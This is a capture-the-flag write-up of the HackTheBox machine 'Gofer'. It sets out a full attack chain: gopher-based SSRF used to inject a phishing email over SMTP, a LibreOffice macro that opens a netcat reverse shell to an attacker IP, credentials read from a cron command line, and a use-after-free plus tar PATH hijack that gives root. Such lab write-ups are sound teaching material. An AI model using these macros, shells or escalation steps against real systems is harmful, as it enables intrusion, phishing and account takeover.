# HackTheBox — Gofer

![OS: Linux](https://img.shields.io/badge/OS-Linux-blue)
![Difficulty: Hard](https://img.shields.io/badge/Difficulty-Hard-red)
![Tags: smb, ssrf, gopher, libreoffice, binary-exploitation](https://img.shields.io/badge/Tags-SMB%20%7C%20SSRF%20%7C%20Gopher%20%7C%20LibreOffice%20%7C%20Binary%20Exploitation-orange)

> **TL;DR** — Anonymous SMB exposes a `.backup/mail` revealing internal users (`jhudson`, `tbuckley`) and a hint about a web proxy. Vhost-fuzzing finds `proxy.gofer.htb` (HTTP-Basic-protected SSRF). The mail also tells us users open `.odt` documents internally — combine the SSRF (gopher://) with a malicious LibreOffice macro to phish `jhudson` into running our reverse shell. As `jhudson`, find `tbuckley`'s creds in a root-run cron command captured by `pspy`. As `tbuckley`, exploit a use-after-free in a SUID `notes` binary by overflowing `username` into `role` to set role=`admin`, then hijack `tar`'s relative path in option 8's backup routine to SUID `bash` → root.

---

## Attack Chain at a Glance

```
nmap → SMB anonymous "shares" → .backup/mail → users + "web proxy" hint
   → wfuzz vhost → proxy.gofer.htb (HTTP-Basic 401)
   → SSRF + Gopher → SMTP injection → phishing email to jhudson
   → with malicious .odt link → LibreOffice macro reverse shell
   → shell as jhudson
   → linpeas (tbuckley apr1 hash = rabbit hole)
   → pspy reveals: root curls proxy with --user tbuckley:ooP4dietie3o_hquaeti
   → SSH as tbuckley
   → /usr/local/bin/notes is SUID root, SGID dev
   → use-after-free: create→delete user, write note → user buffer freed,
     malloc'd back as note buffer → write 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7admin'
     → role field == "admin"
   → option 8 calls system("tar -czvf /root/backups/...") with relative tar
   → drop ./tar in $HOME, prepend $PATH → tar = our script
   → chmod u+s /bin/bash → bash -p → root
```

---

## Table of Contents

- [Reconnaissance](#reconnaissance)
- [SMB — Anonymous .backup/mail](#smb--anonymous-backupmail)
- [Vhost Discovery — proxy.gofer.htb](#vhost-discovery--proxygoferhtb)
- [Initial Foothold — SSRF + Gopher SMTP + LibreOffice Macro](#initial-foothold--ssrf--gopher-smtp--libreoffice-macro)
- [User Flag — jhudson](#user-flag--jhudson)
- [Lateral — pspy Catches tbuckley's Password](#lateral--pspy-catches-tbuckleys-password)
- [Privilege Escalation — UAF + Relative-Path Hijack](#privilege-escalation--uaf--relative-path-hijack)
- [Root Flag](#root-flag)
- [Lessons Learned](#lessons-learned)
- [Tools Referenced](#tools-referenced)

---

## Reconnaissance

### Nmap Scan

```bash
sudo nmap -sSCV -p- --min-rate=5000 -oN nmap.txt 10.129.232.85
```

```
PORT    STATE    SERVICE     VERSION
22/tcp  open     ssh         OpenSSH 8.4p1 Debian 5+deb11u1
25/tcp  filtered smtp
80/tcp  open     http        Apache httpd 2.4.56
|_http-title: Did not follow redirect to http://gofer.htb/
139/tcp open     netbios-ssn Samba smbd 4.6.2
445/tcp open     netbios-ssn Samba smbd 4.6.2
```

Add `gofer.htb` to `/etc/hosts`. The contact form on the homepage errors with:

> "The form action property is not set!"

Useful: there's a form, but it's stubbed out — possibly it goes through the proxy we'll find later.

---

## SMB — Anonymous .backup/mail

### Enum4linux

```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
shares          Disk
IPC$            IPC       IPC Service (Samba 4.13.13-Debian)

[+] Mappings
//target/print$  : DENIED
//target/shares  : OK

S-1-22-1-1000 Unix User\jhudson  (Local User)
S-1-22-1-1001 Unix User\jdavis   (Local User)
S-1-22-1-1002 Unix User\tbuckley (Local User)
S-1-22-1-1003 Unix User\ablake   (Local User)
```

Four users discovered via RID enumeration. Pull the share:

```bash
smbclient --no-pass //10.129.149.216/shares
smb: \> cd .backup
smb: \> get mail
```

The mail is the entire scenario:

```
From jdavis@gofer.htb
To: tbuckley@gofer.htb
Subject: Important to read!

Our dear Jocelyn received another phishing attempt last week and his habit
of clicking on links without paying much attention may be problematic one
day. That's why from now on, I've decided that important documents will
only be sent internally, by mail, which should greatly limit the risks. If
possible, use an .odt format, as documents saved in Office Word are not
always well interpreted by Libreoffice.

PS: Last thing for Tom; I know you're working on our web proxy but if you
could restrict access, it will be more secure until you have finished it.
It seems to me that it should be possible to do so via <Limit>
```

Three plot points the mail hands us:
1. **`jhudson` clicks links recklessly** — perfect phishing target.
2. **`.odt` is the standard format** — LibreOffice macros are fair game.
3. **A web proxy exists, behind `<Limit>`** (Apache directive) — we should look for it.

---

## Vhost Discovery — proxy.gofer.htb

```bash
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
      -u http://gofer.htb/ -H "Host: FUZZ.gofer.htb" --hw 28
```

```
000000084:   401   14 L   54 W   462 Ch    "proxy"
```

Add `proxy.gofer.htb` to `/etc/hosts`. The 401 is HTTP Basic auth.

Confirm the SSRF surface (the `<Limit>` hint suggests `<Limit GET POST>` — the proxy probably restricts only those verbs, leaving others open):

```bash
curl -X POST http://proxy.gofer.htb/index.php?url=http://10.10.14.175:8081
```

Callback received → SSRF works for `POST` despite the 401-on-`GET`.

---

## Initial Foothold — SSRF + Gopher SMTP + LibreOffice Macro

### Plan

The internal SMTP server on `:25` is filtered externally but reachable from the box. Combine:

- **SSRF on `proxy.gofer.htb`** with `url=gopher://...` to send arbitrary TCP bytes to internal services.
- **Gopher payload to SMTP** to inject a phishing email to `jhudson` containing a link to our `.odt`.
- **A malicious LibreOffice document** with an "Open Document" macro.

References:
- [Gopherus](https://github.com/tarunkant/Gopherus) — gopher payload generator
- [SSRF → SMTP writeup](https://infosecwriteups.com/server-side-request-forgery-to-internal-smtp-access-dea16fe37ed2)
- [Malicious LibreOffice Calc macros (jamesonhacking)](https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html)
- [HackTricks — SSRF Gopher SMTP](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)

### Crafting the .odt

Open LibreOffice Writer, **Tools → Macros**, paste:

```basic
REM  *****  BASIC  *****

Sub Main
    Shell("wget http://10.10.14.175:8081/ping")
    Shell("/usr/bin/nc 10.10.14.175 9001 -e /bin/bash")
End Sub
```

Then **Tools → Customize → Events** tab → assign `Main` to **Open Document**. Save as `.odt`.

> 💡 **Why two shells:** the `wget /ping` is a beacon to confirm the macro fired (handy for debugging without a missed reverse shell). The `nc -e` does the actual work.

### Phishing Email via SSRF + Gopher

Set up:
1. `python3 -m http.server 8081` (serves `file.odt` and receives the `/ping`)
2. `nc -lvnp 9001` (catches the reverse shell)

Send the email:

```bash
curl -X POST "http://proxy.gofer.htb/index.php?url=gopher://0.0.0.0:25/'xHELO%2520gofer.htb%250d%250aMAIL%2520FROM%3Atbuckley%2540gofer.htb%250d%250aRCPT%2520To%3Ajhudson%2540gofer.htb%250d%250aDATA%250d%250aFrom%3Atbuckley%2540gofer.htb%250d%250aSubject%3AImportant%2520to%2520read%2521%250d%250aMessage%3APlease%2520read%2520http%3A%2F%2F10.10.14.175%3A8081%2Ffile.odt%250d%250a%250d%250a.%250d%250aQUIT%250d%250a'"
```

URL-decoded:

```
HELO gofer.htb
MAIL FROM: tbuckley@gofer.htb
RCPT TO:   jhudson@gofer.htb
DATA
From: tbuckley@gofer.htb
Subject: Important to read!
Message: Please read http://10.10.14.175:8081/file.odt

.
QUIT
```

When `jhudson`'s mail client follows the link and opens the `.odt`, the macro fires → reverse shell.

---

## User Flag — jhudson

```bash
$ id
uid=1000(jhudson) gid=1000(jhudson) groups=1000(jhudson)
```

Set up persistent SSH access:

```bash
mkdir ~/.ssh/
echo 'ssh-rsa AAAA...' > ~/.ssh/authorized_keys
ssh jhudson@gofer.htb
```

🚩 **User flag captured.**

---

## Lateral — pspy Catches tbuckley's Password

`linpeas.sh` surfaces `tbuckley`'s apr1 hash (`$apr1$YcZb9OIz$fRzQMx20VskXgmH65jjLh/`), but it doesn't crack — that's a rabbit hole.

The real lead: drop [`pspy64`](https://github.com/DominicBreuker/pspy) and watch:

```
2023/07/30 23:19:01 CMD: UID=0  PID=39896
    | /usr/bin/curl http://proxy.gofer.htb/?url=http://gofer.htb
      --user tbuckley:ooP4dietie3o_hquaeti
```

Root is curl-ing the proxy with `tbuckley`'s password on the command line. SSH:

```bash
ssh tbuckley@gofer.htb
# password: ooP4dietie3o_hquaeti
```

> 💡 **Curl creds on the command line are world-visible via `/proc/<pid>/cmdline` while the process runs**, and `pspy` snapshots them. A cron job that re-runs every minute = a credential dispenser for any local user with patience.

---

## Privilege Escalation — UAF + Relative-Path Hijack

`tbuckley` is in the `dev` group. The interesting binary:

```bash
$ ls -la /usr/local/bin/notes
-rwsr-sr-x 1 root dev ... /usr/local/bin/notes
```

SUID root, SGID dev. Decompile in Ghidra to see what it does:

<details>
<summary>Click to expand decompiled main() (cleaned up)</summary>

```c
void main(void) {
  __uid_t uid;
  int cmp;
  int choice = 0;
  char *user = NULL;
  char *note = NULL;

  while (1) {
    puts("=== menu ===\n"
         "1) Create user, choose username\n"
         "2) Show user information\n"
         "3) Delete user\n"
         "4) Write a note\n"
         "5) Show a note\n"
         "6) Save a note (not yet implemented)\n"
         "7) Delete a note\n"
         "8) Backup notes\n"
         "9) Quit\n");
    printf("Your choice: ");
    scanf("%d", &choice);

    switch (choice) {
    case 1:
      user = malloc(0x28);                   // 40 bytes
      memset(user,        0, 0x18);          // first 24 = username field
      memset(user + 0x18, 0, 0x10);          // next 16  = role field
      uid = getuid();
      if (uid == 0) {
        *(uint32_t*)(user + 0x18) = 0x696d6461; // "admi"
        user[0x1c] = 'n';                       // "n"
      } else {
        *(uint32_t*)(user + 0x18) = 0x72657375; // "user"
      }
      printf("Choose an username: ");
      scanf("%s", user);                      // ← unbounded read into user[0..0x18)
      break;

    case 2:
      printf("Username: %s\nRole: %s\n", user, user + 0x18);
      break;

    case 3:
      if (user) free(user);                   // ← user pointer NOT cleared after free
      break;

    case 4:
      note = malloc(0x28);                    // ← same size as user
      memset(note, 0, 0x28);
      puts("Write your note:");
      scanf("%s", note);                      // ← unbounded read
      break;

    case 8:
      cmp = strcmp(user + 0x18, "admin");
      if (cmp == 0) {
        puts("Access granted!");
        setuid(0); setgid(0);
        system("tar -czvf /root/backups/backup_notes.tar.gz /opt/notes");
      } else {
        puts("Access denied: you don't have the admin role!");
      }
      break;
    }
  }
}
```

</details>

### The Use-After-Free

Two bugs combine:

1. **Case 3** frees `user` but doesn't NULL the pointer.
2. **Cases 1 and 4** both `malloc(0x28)` — the freed `user` chunk is recycled to back the `note` allocation (LIFO bin reuse on glibc).

Sequence to hijack the role field:

| Step | Action | Effect |
|------|--------|--------|
| 1 | Choose 1, set username (anything) | `user = malloc(0x28)`, `role = "user"` |
| 2 | Choose 3 | `free(user)`, but `user` still points at the freed chunk |
| 3 | Choose 4, write note `"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7admin"` | `malloc` returns the same chunk → bytes spill across the username/role boundary |
| 4 | Choose 2 | Confirms `Role: admin` |
| 5 | Choose 8 | Passes the `strcmp(role, "admin")` check |

The note string `"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7admin"` is exactly 24 bytes of filler followed by `"admin"` — placing `admin\0` at offset `0x18`, which is the role field's start.

References:
- [r3d-buck3t — Hijacking relative paths in SUID programs](https://medium.com/r3d-buck3t/hijacking-relative-paths-in-suid-programs-fed804694e6e)
- [Use-after-free intro (infosecwriteups)](https://infosecwriteups.com/arming-the-use-after-free-bc174a26c5f4)

### Hijacking `tar`

Choosing option 8 with role=`admin` grants `setuid(0)` and runs:

```c
system("tar -czvf /root/backups/backup_notes.tar.gz /opt/notes");
```

`tar` is invoked **without an absolute path**. `system()` uses `/bin/sh`, which inherits `$PATH`. If we prepend a directory containing our own `tar`, that runs instead — as root.

In `tbuckley`'s home:

```bash
cat > tar <<'EOF'
#!/bin/bash
chmod u+s /bin/bash
EOF
chmod +x tar
export PATH=/home/tbuckley:$PATH
```

Run `notes`, exploit the UAF, choose 8 → our `tar` runs as root → `bash` is now SUID. Exit, then:

```bash
bash -p
```

```
bash-5.0# id
uid=1002(tbuckley) gid=1002(tbuckley) euid=0(root) ...
```

---

## Root Flag

```bash
bash-5.0# cat /root/root.txt
```

🚩 **Root flag captured.**

---

## Lessons Learned

- **Read the mail.** Boxes that include a fake email aren't just flavor — every detail in `mail` was load-bearing here (the `.odt` hint, the proxy hint, the *target user* who clicks links).
- **`<Limit GET POST>` only restricts named methods.** Every Apache `<Limit>` block is an opportunity to find a method the admin didn't think to list.
- **Gopher is the universal SSRF protocol.** Any TCP service reachable from the box becomes reachable from the SSRF.
- **`curl --user user:pass` on a cron command line is a credential leak**. So is `psql ... password` and `mysql -p<pass>`. `pspy` makes them findable.
- **`free()` without `ptr = NULL` is a UAF in waiting.** When the same allocator pool is reused for different "types" (user vs note), the first 24 bytes of the new object can be partially overwritten by spilled bytes from the previous logical structure.
- **`system()` with relative-path commands is an instant privesc** when the SUID/SGID context inherits a user-controlled `$PATH`. Always check for SUID binaries that shell out without absolute paths.

---

## Tools Referenced

| Tool | Purpose |
|------|---------|
| [`nmap`](https://nmap.org/) | Initial scan |
| [`enum4linux`](https://github.com/CiscoCXSecurity/enum4linux) | SMB enumeration / RID brute-forcing |
| [`smbclient`](https://www.samba.org/) | Pulling the `mail` from `.backup` |
| [`wfuzz`](https://github.com/xmendez/wfuzz) | Vhost brute-force |
| [Gopherus](https://github.com/tarunkant/Gopherus) | Gopher SSRF payload generation |
| [LibreOffice macros](https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html) | Phishing payload via .odt |
| [`pspy`](https://github.com/DominicBreuker/pspy) | Catching the curl-with-creds cron |
| [Ghidra](https://ghidra-sre.org/) | Decompiling `notes` binary |
